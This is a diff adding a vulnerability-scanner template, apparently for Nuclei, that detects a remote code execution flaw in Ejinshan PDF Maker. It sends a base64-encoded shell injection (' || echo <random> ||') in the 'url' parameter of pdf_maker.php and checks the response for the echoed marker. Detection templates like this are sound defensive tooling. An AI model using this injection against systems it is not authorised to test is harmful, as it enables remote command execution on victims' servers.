@@ -1,0 +1,30 @@
+id: ejinshan-zdv8-rce
+info:
+  name: Ejinshan PDF Maker RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Remote Code Execution vulnerability in Ejinshan PDF Maker. The vulnerability is exploited by injecting a payload into the `url` parameter and verifying the response for command execution results.
+
+variables:
+  r1: '{{rand_text_alpha(20)}}'
+  cmdcode: '{{concat(" || echo ", r1, " ||")}}'
+  b64: '{{base64(cmdcode)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/inter/pdf_maker.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'url={{b64}}&fileName=xxx'
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{r1}}'
+        part: body
